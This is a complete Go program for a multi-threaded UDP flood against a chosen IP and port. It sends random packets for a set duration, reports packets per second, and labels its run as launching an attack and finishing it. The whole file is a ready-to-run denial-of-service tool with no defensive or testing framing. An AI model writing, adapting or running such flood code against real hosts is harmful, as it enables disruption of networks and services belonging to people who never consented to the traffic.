package main

import (
	"flag"
	"fmt"
	"math/rand"
	"net"
	"os"
	"os/signal"
	"sync"
	"time"
)

var (
	ip      = flag.String("ip", "", "Target IP address")
	port    = flag.Int("port", 0, "Target port")
	size    = flag.Int("size", 1024, "Payload size in bytes")
	timeSec = flag.Int("time", 10, "Duration in seconds")
	threads = flag.Int("threads", 10, "Number of concurrent threads")
)

var (
	packetCount uint64
	lock        sync.Mutex
	stop        = make(chan struct{})
)

func sendUDP(target string, data []byte, stopTime time.Time, wg *sync.WaitGroup) {
	defer wg.Done()

	addr, err := net.ResolveUDPAddr("udp", target)
	if err != nil {
		fmt.Println("Resolve error:", err)
		return
	}
	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		fmt.Println("Dial error:", err)
		return
	}
	defer conn.Close()

	for time.Now().Before(stopTime) {
		conn.Write(data)
		lock.Lock()
		packetCount++
		lock.Unlock()
	}
}

func statsPrinter(duration time.Duration) {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	start := time.Now()
	var lastCount uint64

	for range ticker.C {
		elapsed := time.Since(start)
		if elapsed >= duration {
			break
		}
		lock.Lock()
		diff := packetCount - lastCount
		lastCount = packetCount
		lock.Unlock()
		fmt.Printf("[*] PPS: %d | Total Packets: %d\n", diff, lastCount)
	}
}

func main() {
	flag.Parse()

	if *ip == "" || *port == 0 {
		fmt.Println("Usage: ./udp_safe_stats -ip <target_ip> -port <port> -size <payload_size> -time <seconds> -threads <count>")
		return
	}

	target := fmt.Sprintf("%s:%d", *ip, *port)
	payload := make([]byte, *size)
	rand.Read(payload)

	duration := time.Duration(*timeSec) * time.Second
	stopTime := time.Now().Add(duration)

	go statsPrinter(duration)

	var wg sync.WaitGroup
	fmt.Printf("Launching UDP flood to %s for %ds with %d threads...\n", target, *timeSec, *threads)

	for i := 0; i < *threads; i++ {
		wg.Add(1)
		go sendUDP(target, payload, stopTime, &wg)
	}

	// Support Ctrl+C to stop early
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt)
	go func() {
		<-sig
		fmt.Println("\n[!] Interrupted.")
		os.Exit(0)
	}()

	wg.Wait()
	fmt.Println("[✓] Attack finished.")
}